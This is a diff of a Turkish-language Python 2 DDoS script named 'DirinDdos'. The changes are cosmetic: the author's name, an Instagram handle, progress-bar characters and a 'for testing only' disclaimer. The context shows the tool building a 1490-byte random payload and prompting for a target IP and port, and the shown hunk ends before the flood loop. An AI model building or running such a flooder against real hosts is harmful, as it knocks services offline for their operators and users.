@@ -20,25 +20,26 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DirinDdos")
-print "Kodlayan : Ucube Dirin"
+print "Yapimci : Dirin"
 print "Sadece arkadaslarima ozel <3"
-print "Arkadaslar deneme amacli yaptim kotu islere bulasmayin benden degil asko <3"
+print "Instagramim:Dirinizzmxdd"
+print "Arkadaslar deneme amacli yaptim kotu islere bulasmayin :D"
 ip = raw_input("Hedef IP : ")
-port = input("Port       : ")
+port = input("Hedef Port       : ")
 os.system("clear")
 print("\033[93m")
 os.system("figlet DirinDdos Saldirisi")
-print("Ucube Dirin sunar <03")
+print("Dirin Sunar :)")
 print ("\033[92m")
 print "[                    ] 0% "
 time.sleep(5)
-print "[=====               ] 25%"
+print "[§§§§§               ] 25%"
 time.sleep(5)
-print "[==========          ] 50%"
+print "[§§§§§§§§§§          ] 50%"
 time.sleep(5)
-print "[===============     ] 75%"
+print "[§§§§§§§§§§§§§§§     ] 75%"
 time.sleep(5)
-print "[====================] 100%"
+print "[§§§§§§§§§§§§§§§§§§§§] 100%"
 time.sleep(3)
 sent = 0
 while True:
